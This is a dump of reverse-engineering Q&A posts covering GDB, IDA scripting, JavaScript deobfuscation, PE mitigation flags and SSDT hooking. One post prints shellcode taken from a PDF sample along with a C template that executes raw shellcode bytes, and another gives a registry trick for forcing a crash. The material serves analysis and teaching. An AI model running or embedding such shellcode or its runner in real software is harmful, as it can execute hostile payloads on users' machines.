","<p>Easy enough. In your case what you most likely want is <a href=""http://www.sourceware.org/gdb/onlinedocs/gdb.html#Break-Commands"" rel=""nofollow noreferrer""><code>commands</code></a> which can be used to create ""routines"" that run whenever a breakpoint is hit. For your case roughly:</p>

<pre><code>break boost::uuids::detail::sha1::process_bytes
commands 1
x/s $rcx
continue
end
</code></pre>

<p>Problem is that you need to hardcode the breakpoint number. Depending on the GDB version you may get around this using the <code>$bpnum</code> convenience variable. So:</p>

<pre><code>break boost::uuids::detail::sha1::process_bytes
commands $bpnum
x/s $rcx
continue
end
</code></pre>

<p>Also see <a href=""https://stackoverflow.com/a/11019683/476371"">this</a> concerning the last example.</p>

<p><strong>Note:</strong> using this method can be quite taxing on the CPU depending on how often this gets called and whether a hardware breakpoint could be used by GDB.</p>

<hr>

<p>You can also use the conditional form of breakpoints. Check out the actual authoritative reference <a href=""http://www.sourceware.org/gdb/onlinedocs/gdb.html#Set-Breaks"" rel=""nofollow noreferrer"">here</a>. The form looks like this:</p>

<pre><code>break ... if cond
</code></pre>

<p>You can also set the condition independent of setting the breakpoint, if you know the breakpoint number. Use <code>info break</code> to get the number of the breakpoint and then use that as <code>bnum</code> in:</p>

<pre><code>condition bnum expression
</code></pre>
","3343"
"Parsing IDA Pro .asm files","1257","","<p>Does anyone know of projects that parse the disassembly from IDA Pro using a lexer and/or parser generator library? But I would also totally be fine with JSON or XML format. So far, I have been able to produce HTML from the GUI, but I am looking for a command line tool that will parse disassembly files produced by IDA Pro.   </p>
","<p>You'd be better off using IDC functions like <a href=""https://www.hex-rays.com/products/ida/support/idadoc/274.shtml"" rel=""nofollow"">GetMnem()</a>, <a href=""https://www.hex-rays.com/products/ida/support/idadoc/276.shtml"" rel=""nofollow"">GetOpType()</a>, <a href=""https://www.hex-rays.com/products/ida/support/idadoc/277.shtml"" rel=""nofollow"">GetOperandValue()</a>, etc. to extract IDA's disassembly than exporting to JSON/XML.</p>

<p>You can use <a href=""https://www.hex-rays.com/products/ida/support/idadoc/417.shtml"" rel=""nofollow"">command-line switches</a> to run IDA in batch-mode with your IDC script to automate the entire process.</p>
","2635"
"How to deobfuscated javascript?","1256","","<p>How to deobfuscate javascript file, i have a javascript code are deobfuscate .</p>

<hr>

<p>Code: <a href=""http://pastebin.com/zFH2GidN"" rel=""nofollow"">http://pastebin.com/zFH2GidN</a>
Help me and thanks you.</p>
","<p><strong>UPDATE</strong></p>

<p>Based on @ws's comment and @nderscore's code, use <a href=""http://jsfiddle.net/AcidShout/0fjcsw00/"" rel=""noreferrer"">this JSFiddle</a> to decode the thing.</p>

<hr>

<p>To find the password that this script asks for, you can use a simple debugging trick.</p>

<ul>
<li>Go to <a href=""http://www.jsfuck.com/"" rel=""noreferrer"">JSFuck</a> and uncheck the <code>Eval Source</code> option.</li>
<li>Paste the obfuscated JavaScript</li>
<li>Run</li>
</ul>

<p>You'll see:</p>

<p><a href=""https://i.stack.imgur.com/QrI4o.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/QrI4o.png"" alt=""enter image description here""></a></p>

<p>It seems to be calling <a href=""https://developer.mozilla.org/en-US/docs/Web/API/Window/prompt"" rel=""noreferrer""><code>prompt()</code></a>, so put a breakpoint on it, like this:</p>

<p><em>(I'll be using Chrome for this)</em></p>

<ul>
<li>Open console (<kbd>F12</kbd>)</li>
<li>Backup the original <code>prompt</code> like this: <code>window.prompt_ = window.prompt</code></li>
<li>Override the call to prompt with a breakpoint: <code>window.prompt = function(a, b){ debugger; return window.prompt_(a, b); }</code></li>
<li>Click <code>Run This</code></li>
<li>You'll break here:</li>
</ul>

<p><a href=""https://i.stack.imgur.com/EQq4Q.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/EQq4Q.png"" alt=""enter image description here""></a></p>

<ul>
<li>Check the callstack at the right bottom.</li>
<li>Go back one function, and you'll see:</li>
</ul>

<p><a href=""https://i.stack.imgur.com/LsnJW.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/LsnJW.png"" alt=""enter image description here""></a></p>

<h1>Bingo!</h1>

<p>Password is <code>forevermore</code>:</p>

<p><a href=""https://i.stack.imgur.com/D7whU.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/D7whU.png"" alt=""enter image description here""></a>
<a href=""https://i.stack.imgur.com/603Do.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/603Do.png"" alt=""enter image description here""></a></p>
","10951"
"Need advice : Reverse engineering a pdf with shellcode","1254","","<p><strong>Problem</strong> :</p>

<p>I try to find the plaintext which was hidden at pdf inbuilt with shellcode </p>

<p><strong>What i tried</strong> :</p>

<p>I received a pdf which contains javascript with it ,i dig the pdf as follows :</p>

<p><strong>Exploring  JavaScript inside</strong>:</p>

<pre><code>root@kali:~# pdfid APT9001.pdf 
PDFiD 0.0.12 APT9001.pdf
 PDF Header: %PDF-1.5
 obj                   10
 endobj                 9
 stream                 3
 endstream              3
 xref                   2
 trailer                2
 startxref              2
 /Page                  3(2)
 /Encrypt               0
 /ObjStm                0
 /JS                    1(1)
 /JavaScript            1(1)
 /AA                    0
 /OpenAction            1(1)
 /AcroForm              0
 /JBIG2Decode           1(1)
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /Colors &gt; 2^24         0
</code></pre>

<p>while extracting  it:</p>

<pre><code>root@kali:~# pdf-parser -s javascript APT9001.pdf 
obj 5 0
 Type: /Action
 Referencing: 6 0 R

  &lt;&lt;
    /Type /Action
    /S /JavaScript
    /JS 6 0 R
  &gt;&gt;


root@kali:~# pdf-parser -o 6 APT9001.pdf 
obj 6 0
 Type: 
 Referencing: 
 Contains stream

  &lt;&lt;
    /Length 6170
    /Filter '[  \r\n /Fla#74eDe#63o#64#65  /AS#43IIHexD#65cod#65 ]'
  &gt;&gt;


root@kali:~# pdf-parser -o 6 -d APT9001.js -f APT9001.pdf 
obj 6 0
 Type: 
 Referencing: 
 Contains stream

  &lt;&lt;
    /Length 6170
    /Filter '[  \r\n /Fla#74eDe#63o#64#65  /AS#43IIHexD#65cod#65 ]'
  &gt;&gt;
</code></pre>

<p>If i open the JavaScript file, i can quickly find the shellcode:</p>

<blockquote>
  <p>%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff</p>
</blockquote>

<p>Now i am stucked with this part ,now how can i explore further :</p>

<p>the possible solutions which i might think were</p>

<p>convert these shellcode to exe and exporting it as txt 
once the text was recovered exploring the stack of it{assumption]</p>

<p>am i on right way?or any community ideas to reverse engineer these further?</p>
","<p>The shellcode is <a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/escape"" rel=""nofollow noreferrer"">unicode escaped</a>. You can convert it to its hex representation using a simple python script.</p>

<pre><code>from binascii import unhexlify as unhx

encoded = open('encoded.txt').read() # The shellcode dump
out = open('shellcode.bin', 'wb')

for s in encoded.split('%'):
    if len(s) == 5:
        HI_BYTE = s[3:]
        LO_BYTE = s[1:3]
        out.write(unhx(HI_BYTE))
        out.write(unhx(LO_BYTE))
out.close()
</code></pre>

<p><em>shellcode.bin</em> contains the shellcode in its binary form. You can convert the shellcode to an executable using the following C template or using an online tool such as <a href=""http://sandsprite.com/shellcode_2_exe.php"" rel=""nofollow noreferrer"">this</a></p>

<pre><code>#include &lt;stdio.h&gt;

unsigned char payload[] = 
{
//Bytes of the shellcode
};

int main(int argc, char **argv) {
    (*(void (*)()) payload)();
    return(0);
}
</code></pre>

<p>Running the resultant executable produces this output.</p>

<p><img src=""https://i.stack.imgur.com/aW07K.png"" alt=""enter image description here""></p>
","9206"
"How to get the CPU architecture via Idapython?","1250","","<p>I was not able to find an API function to get the CPU architecture of the loaded binary. 
In <code>idaapi.py</code>, there is a function <code>def set_processor_type(*args)</code> but no equivalent such as <code>get_processor_type</code>.</p>

<p>I don't want to fall back to running some additional (python) tool such as file, readelf or a python ELF parser. I also don't like the idea of parsing the strings displayed at the beginning of the IDA assembly listing.</p>

<p>There must be a way to use <code>idc.py</code>, <code>idaapi.py</code> or <code>idautils.py</code> for this.</p>
","<p>You can get the name of the processor from the <code>idainfo</code> struct:</p>

<pre><code>import idaapi

info = idaapi.get_inf_structure()

if info.is_64bit():
    bits = 64
elif info.is_32bit():
    bits = 32
else:
    bits = 16

endian = ""little""
if info.mf:
    endian = ""big""

print 'Processor: {}, {}bit, {} endian'.format(info.procName, bits, endian)
# Result: Processor: mipsr, 32bit, big endian
</code></pre>

<p>Still haven't found the endian, though.</p>

<p>EDIT:
Endian can be determined by processor name. For example, <code>mipsr</code> is big endian, and <code>mipsrl</code> is little endian.</p>

<p>EDIT:<br>
Added a proper endian check (<code>mf</code> == MSB First). Based on <a href=""https://reverseengineering.stackexchange.com/questions/11396/how-to-get-the-cpu-architecture-via-idapython/14326#14326"">this answer</a>.</p>
","11398"
"IDA Pro: How can I set memory breakpoint on field of structure?","1249","","<p>How can I set memory breakpoint on field of structure ?</p>

<p>Currently if I mapped structure to memory region it uses starting address of structure as address of all fields. See screenshow</p>

<p><img src=""https://i.stack.imgur.com/d6dt6.png"" alt=""enter image description here""></p>

<p>As result I cannot quickly add breakpoint to field <code>isHandshakeReceived</code>. I'd need to manually calculate its address.</p>

<p>Is there easier method ?</p>
","<p>Like most input fields in IDA, the breakpoint dialogue's Location field accepts expressions like </p>

<pre><code>eax + GetMemberOffset(GetStrucIdByName(""foo_t""), ""isHandshakeReceived"")
</code></pre>

<p>I have no idea why IDA doesn't accept <code>0x376e5f0 + foo_t.isHandshakeReceived</code>... Anyway, being able to enter expressions is very useful and it can save a lot of hassle.</p>

<p>The erroneous address display is a result of the simplistic way in which IDA manages things internally. Basically, everything contained in a struct or array belongs to its starting address ('head'), and if the display is continued over multiple lines then IDA simply reprints the starting address instead of the correct address. It's a bit annoying but that's the way IDA works.</p>

<p>P.S.: perhaps it would be worth it to file a defect report or post in IDA's bug forum; after all, the displayed addresses are definitely wrong. I wouldn't hold my breath but who knows...</p>
","7971"
"how use pefile to check for NX, ASLR, SAFESEH and CFG (Control Flow Guard) flag","1245","","<p>i use <code>pefile</code> library for help me in vulnerability research,malware analysis  and exploit development and try to write script help me to know which protections binary use</p>

<p>i know <code>mona.py</code> from corelan team but i just need to write some tools will help me without use mona <code>because i'm not use immunity debugger i use python debugger</code></p>

<p>====update=========<br>
i wrote this script  </p>

<pre><code>import os.path
import sys
import pefile

class PESecurityCheck:

  IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x0040
  IMAGE_DLLCHARACTERISTICS_NX_COMPAT = 0x0100
  IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400
  IMAGE_DLLCHARACTERISTICS_GUARD_CF = 0x4000



  def __init__(self,pe):
    self.pe = pe

  def aslr(self):
    return bool(self.pe.OPTIONAL_HEADER.DllCharacteristics &amp; self.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)

  def dep(self):
    return bool(self.pe.OPTIONAL_HEADER.DllCharacteristics &amp; self.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)

  def seh(self):
    return bool(self.pe.OPTIONAL_HEADER.DllCharacteristics &amp; self.IMAGE_DLLCHARACTERISTICS_NO_SEH)

  def CFG(self):
    return bool(self.pe.OPTIONAL_HEADER.DllCharacteristics &amp; self.IMAGE_DLLCHARACTERISTICS_GUARD_CF)

if len(sys.argv) &lt; 2:
  print 'Usage: %s &lt;file_path&gt;' % sys.argv[0] 
  sys.exit()

def main():
  file_path = sys.argv[1]   

  try:
    if os.path.isfile(file_path):
      pe = pefile.PE(file_path,True)
    else:
      print ""File '%s' not found!"" % file_path     
      sys.exit(0)  
  except pefile.PEFormatError:
    print ""Not a PE file!""
    sys.exit(0)  

  ps = PESecurityCheck(pe)

  if ps.aslr():
    print ""[+] ASLR Enabled""
  else:
    print ""[-] ASLR Not Enabled""

  if ps.dep():
    print ""[+] DEP Enabled""
  else:
    print ""[-] DEP Not Enabled""

  if ps.seh():
    print ""[+] SEH Enabled""
  else:
    print ""[-] SEH Not Enabled""

  if ps.CFG():
    print ""[+]CFG Enabled""
  else:
    print ""[-] CFG Not Enabled""

if __name__ == '__main__':
  main()
</code></pre>
","<p><strong>NX:</strong></p>

<p><code>IMAGE_OPTIONAL_HEADER.DllCharacteristics &amp; IMAGE_DLLCHARACTERISTICS_NX_COMPAT != 0</code></p>

<p><strong>ASLR:</strong></p>

<p><code>IMAGE_OPTIONAL_HEADER.DllCharacteristics &amp; IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE != 0</code></p>

<p><strong>SAFESEH:</strong></p>

<p><code>(IMAGE_OPTIONAL_HEADER.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress != 0)
&amp;&amp; (IMAGE_OPTIONAL_HEADER.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].Size != 0 )</code></p>

<p><strong>CFG:</strong></p>

<p><code>IMAGE_OPTIONAL_HEADER.DllCharacteristics &amp; IMAGE_DLLCHARACTERISTICS_GUARD_CF != 0</code></p>
","9297"
"What are the open source symbolic execution tools for windows binaries","1240","","<p>I want to test some approach in symbolic execution in windows binaries and doesn't want to write a new one from scratch and also this tool must be reliable at research levels.</p>

<p>I found S2E and BitBlaze earlier but not any documentation for testing windows binaries.</p>
","<p><strong><a href=""https://github.com/jjyg/metasm/"" rel=""nofollow"">Metasm</a></strong> and <strong><a href=""https://github.com/cea-sec/miasm"" rel=""nofollow"">Miasm</a></strong> can perform symbolic execution on Windows binaries. <em>Metasm</em> is written in pure ruby with no dependencies. <em>Miasm</em> is written in python. You can find some usages of the above frameworks in the book <em><a href=""http://rads.stackoverflow.com/amzn/click/1502489309"" rel=""nofollow"">Practical Reverse Engineering</a></em>. Besides you can always Google for more.</p>

<p><a href=""http://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html"" rel=""nofollow"">Here</a> is an hands-on example of using miasm for symbolic execution.</p>
","6895"
"kernel32.BaseThreadInitThunk without IAT","1233","","<p>On starting <code>notepad.exe</code> with Ollydbg, I see that <code>eax</code> has a value that points at <code>kernel32.BaseThreadInitThunk</code>.</p>

<p><code>notepad.exe</code> does not seem to import <code>kernel32.dll::BaseThreadInitThunk</code>.
I cannot find that function, by running dependency walker on <code>notepad.exe</code>.</p>

<p>How can <code>kernel32.dll::BaseThreadInitThunk</code> function be executed without importing it ?</p>
","<p>It is just a coincidence. It happens sometimes that the value in a register be the address of some valid api which the application has nothing to do about. For reference see these images.</p>

<p>I have loaded OllyDbg2 in OllyDbg2. OllyDbg2 does not import <code>kernel32.dll::BaseThreadInitThunk</code></p>

<p><img src=""https://i.stack.imgur.com/K1APm.jpg"" alt=""In Windows 7"">
<strong>Ollydbg in Windows 7</strong></p>

<p><img src=""https://i.stack.imgur.com/Tb2Pj.jpg"" alt=""In Windows XP"">
<strong>Ollydbg in Windows XP</strong></p>

<p>In Windows 7 on entrypoint the value of <code>eax</code> is the address of <code>BaseThreadInitThunk</code>. However on Windows XP the value of <code>eax</code> is 0.</p>
","4683"
"Set breakpoints on all references in IDA","1222","","<p>Is there a way to set breakpoints on all references in one click like we do in OllyDBG ""Set breakpoint on every reference"" ?</p>

<p>E.g: after locating CreateFileA API and pressing ""x"" to see all references, we can see where all calls for this function are ... but is there a way to set bps on all calls in one click ?</p>
","<p>I don't know about existence of such an ability in IDA, but you can do it with IDAPython as follows:</p>

<pre><code>#I didn't check this code, use carefully, beware of errors

import idc
import idaapi
import idautils

def set_breakpoints_on_calls(ea):
    print ""Setting breakpoints on "", hex(ea)
    for ref in idautils.CodeRefsTo(ea, 0):
        print ""Adding bpt on "", hex(ref)
        idc.AddBpt(ref)

def set_breakpoints_on_screen_ea():
    print ""Started""
    set_breakpoints_on_calls(idc.ScreenEA())

idaapi.add_hotkey(""Alt-Z"", set_breakpoints_on_screen_ea)
</code></pre>

<p>By running this code from execute script window you are adding hotkey Alt-Z
which sets breakpoints to all calls to the address where cursor is located.
You can add this code to <code>idapythonrc.py</code> file in IDA root folder to make this shortcut persistent (you'll need to rerun IDA after it).</p>
","8733"
"Is there an easy way to detect if the SSDT has been patched from a memory dump?","1220","","<p>The <a href=""http://en.wikipedia.org/wiki/System_Service_Dispatch_Table"">SSDT</a> is a dispatch table inside the Windows NT kernel, and it is used for handling calls to various internal kernel APIs. Often malware will change addresses in the SSDT in order to hook certain kernel functions. Spotting this kind of thing in a memory dump would be awesome, because it would allow me to identify potential rootkits. Is there a way to reliably detect them? What kind of memory dump is required?</p>
","<p>No <em>absolutely reliable</em> way, no.</p>

<p>Either way you'll need a full dump, but the problem is that malware could even hook the responsible functions inside the kernel and modify <em>what</em> gets dumped. There are several things that have to be considered here.</p>

<p>You <em>can</em> detect it if the malware used a trivial method for hooking in the first place. Let's assume the address was replaced by one to a trampoline or to inside another loaded image (or even outside one just in nonpaged pool), then you can <em>easily detect</em> it. You can simply enumerate all the modules and attempt to find the one inside which the address from inside the SSDT points. In case of a trampoline you'll have to disassemble the instructions there to see where it jumps/calls. There are plenty of libraries out there for the purpose, such as <a href=""http://udis86.sourceforge.net/""><code>udis86</code></a>.</p>

<p>However, if a malware is sneaky, it could use the natural gaps inside an executable (such as the kernel) when loaded into memory. As you probably know, the way a PE file (such as <code>ntoskrnl.exe</code> and friends) is represented differently on disk and in memory. The on-disk file format is more terse. Loaded into memory, the sections are aligned in a particular way described in the PE header. This way gaps will likely exist between the real size of a section (end) and the properly aligned section size (""padding""). This leaves place to <em>hide</em> something like a trampoline or even more shell code than a simple trampoline. So a naive check such as the above - i.e. enumerating modules and checking whether the SSDT functions point inside the kernel image - will not work. It would get bypassed by malware sophisticated enough to do what I just described.</p>

<p>As you can imagine, this means that things - as all things malware/anti-malware - quickly becomes an arms race. What I would strongly suggest is that you attach a kernel debugger (<code>WinDbg</code> via Firewire comes to mind) and keep the infected (or allegedly infected) machine in limbo while you investigate. While you are connected and broke into the debugger, the debuggee can't do anything. This can be used to debug a system live and - assuming the malware wasn't sneaky enough to also manipulate <code>kdcom</code> - to gain valuable metrics - it can also be used to create a crashdump directly (see WinDbg help). If you have conclusive evidence that a machine is infected, due to symptoms it exhibits, odds are the malware isn't all too sophisticated and you will not have to care about the special case I outlined. However, keep in mind that this special case can only be considered <em>one</em> out of many conceivable cases used to hide. So long story short: there is no <em>absolutely reliable</em> way to do what you want.</p>

<p>It has sometimes been said - and it's true - that the attacker just needs to find one out of an infinite number of attack vectors, whereas the defender can only defend a finite number of <em>known</em> attack vectors. The lesson from this should be that we - as anti-malware industry (in which I work) - can always claim that <em>we</em> didn't find anything on the system, but that it is wrong to claim that the system is clean.</p>

<hr>

<h2>How to deliberately cause a BSOD</h2>

<p>The keyboard driver(s) can be told to cause a BSOD:</p>

<pre><code>HKLM\CurrentControlSet\Services\kbdhid\Parameters
</code></pre>

<p>or (for older PS/2 keyboards)</p>

<pre><code>HKLM\SYSTEM\CurrentControlSet\Services\i8042prt\Parameters
</code></pre>

<p>And there set a <code>REG_DWORD</code> named <code>CrashOnCtrlScroll</code> to <code>1</code>.</p>

<p>After the next reboot you can force the blue screen by <kbd>Ctrl</kbd>+<kbd>ScrollLk</kbd>+<kbd>ScrollLk</kbd>. The bug check code will in this case be <code>0xE2</code> (<code>MANUALLY_INITIATED_CRASH</code>).</p>

<hr>

<p>Side-note: I have also read, but never seen it in a kernel debugging session myself or in any kind of FLOSS implementation, that some method tries to re-load the kernel from the image on disk and run it through the early initialization steps, thereby creating a ""shadow"" SSDT. This one would then be pristine and could be used to ""unhook"" everything in one fell swoop from the original SSDT. Again, haven't seen this implemented, but from my knowledge of the internals it seems a possibility. Of course this plays more with the idea of detecting/unhooking a rootkit's functions than it does with your original intention of getting a memory dump of an infected system.</p>
","1466"
"how can the processor instruction set be identified solely by examining a binary image?","1216","","<h1>Constraints:</h1>

<p>I am doing reverse engineering of a binary firmware image of unknown provenance, which operates on a device that is <strong>not</strong> physically accessible to me.  That is, I can't take apart the device, don't have even block diagrams for its function, and have no ability to identify the microprocessor by visual inspection or by asking the creator of the object.  Literally the <em>only</em> thing available is the binary image.</p>

<h1>The Question:</h1>

<p>My question is: <strong>given those constraints</strong> what tools or theoretical approaches could be employed to identify the processor's instruction set by examining the binary?  </p>

<h1>Research so far:</h1>

<p>I have, of course, attempted to use disassemblers for various popular ISAs such as ARM, x86 and MIPS.  I have also done a literature search for research papers but haven't turned up anything at all.</p>

<p>Ideally, what I'd like is a tool that would examine the binary and then report something like ""75% probability that this is code for a Renesas M16C."" </p>
","<p>This is extremely hard to perform. Given no initial information, you'll have to go through it heuristically using pattern matching &amp; probabilistic approximations.</p>

<p>I've been working for two years on such a tool (I have written tons of helpful tools destined to be used by myself for work &amp; which I plan to share someday, not soon though). It works, but it's not mature enough to be thrown in the jungle. My approach is as follows : detect binary format data structures if possible, disassemble a chunk of binary code by using multiple instruction set encoding (ARM, x86, MIPS, ...) and then heuristically assess (using bads &amp; some other stuff :]) which is closer ...    </p>

<p>But interestingly, your question has been asked <a href=""https://reverseengineering.stackexchange.com/questions/2897/tool-or-data-for-analysis-of-binary-code-to-detect-cpu-architecture"">here</a> before and an interesting approach was given and considered an answer. It uses a similar approach as in biology to identify the phylogenetic distance. </p>
","4506"
"Kernel level Dynamic Binary Instrumentation","1209","","<p>Is there anything like PIN or DynamoRIO to instrument at Kernel level? The platforms I'm more interested on are Windows and OSX.</p>
","<p>Tools like Qemu or Bochs are IMO pretty similar to DBI frameworks conceptually and they work on the entire system, including the kernel. Research efforts like <a href=""http://bitblaze.cs.berkeley.edu/"" rel=""nofollow"">BitBlaze</a> and <a href=""http://dslab.epfl.ch/proj/s2e"" rel=""nofollow"">S2E</a> have used modified versions of Qemu to trace kernel mode components for bug finding. </p>

<p>The key difference, I think, is that Qemu/Bochs as whole system emulators do not present a by default view of the program under inspection as a DBI does. A DBI allows for dynamic editing of the program by default. Emulators have the primitives required to effect DBI, they can read and write memory and by extension program code, but they do not provide the API that PIN does for program modification.</p>

<p>So the best I can do is, you can use Qemu to make a kernel mode DBI and others have done this, but I don't know of something more usable out of the box. </p>
","1874"
"Why I can not find all the functions using this IDC script?","1206","","<p>On Linux 32 bit, I use IDA Pro + IDC script to dump all the functions. Here is part of the script:</p>

<pre><code>addr = 0;
for (addr = NextFunction(addr); addr != BADADDR; addr = NextFunction(addr)) {
    name = Name(addr);
    end = GetFunctionAttr(addr, FUNCATTR_END);
    Message(""%s:\n"", name);

    dumpFunction(name, addr, end);
}
</code></pre>

<p>Certain functions, like <code>close_stdin</code> defined in GNU coreutils static library, can not be found in this script but I can find those functions in <code>File-&gt;Produce File-&gt;Create ASM File...</code></p>

<p>Is there something wrong with my script? Can I use it to find out all the functions?</p>
","<p>Your script is OK. IDA possibly doesn't recognize your function as a function during auto-analysis and that's a possible problem.
If you will go to the address of this function in IDA pro, press P in disassembly view on this address and rerun the script you'll possibly have your function dumped.</p>

<p>There is a very incorrect solution for this problem (incorrect means that it is not always provide good/correct results).
If you will pass on any non-function area and create functions automatically with the script below everything that was not defined as function before will be dumped with your script, but I'm not sure for correctness of these results. </p>

<pre><code>#I didn't check this code, run on your own risk, 
#use carefully, beware errors

import idaapi
import idc

segm = idaapi.get_segm_by_name("".text"")
start = segm.startEA
end = segm.endEA

while start &lt; end:

  start = idaapi.find_not_func(start, 1)
  print ""Attempt to create function at"", hex(start)
  idc.MakeFunction(start)

  start += 1 # for a case of any error 
</code></pre>
","3692"
"Determind length of instructions in bytes","1204","","<p>Where is it possible to find a list of x86 instructions (and x64 instructions) with the (hex) opcode and the length/size in bytes of the instructions, such as:</p>

<ul>
<li><code>0x90</code> = <code>NOP</code> = 1 byte</li>
<li><code>0xE9</code> = <code>JMP</code> = 5 bytes</li>
<li><code>0x8B</code> = <code>MOV</code> = 2 bytes</li>
<li><code>0x55</code> = <code>PUSH</code> = 1 byte</li>
<li><code>0x6A</code> = <code>PUSH</code> = 2 bytes</li>
<li><code>0x68</code> = <code>PUSH</code> = 5 bytes</li>
</ul>

<p><em>Unsure if all of them are correct.</em></p>

<p>I've been using <a href=""http://ref.x86asm.net/coder32.html"" rel=""nofollow"">this wonderful list</a>, to look through instructions and their opcodes, but it doesn't contain the full length/size in bytes of each opcode.</p>

<p>What confuses me a bit more, is how it at the beginning mentions ""one-byte opcodes"" and ""two-byte opcodes"". While the <code>JMP</code> command would be 5 bytes (1 byte for <code>JMP</code> command, 4 bytes for jump distance).</p>

<p><strong>Edit</strong></p>

<p>I don't specifically need a list per se. Overall I'm just searching for a way to deduce the length of instructions.</p>
","<p>Instead of using a list, it would probably be much more efficient for you to use a small and portable length disassembler, such as <a href=""https://github.com/greenbender/lend"" rel=""noreferrer"">https://github.com/greenbender/lend</a>.</p>
","12455"
"How to connect two Windows VMWare virtual machines over a virtual serial port for kernel debugging on a Linux host","1204","","<p><strong>The problem:</strong> Recently I had to perform a kernel debugging on two MS windows VMWare virtual machines connected via a virtual serial port, and while running on a GNU/Linux host.</p>

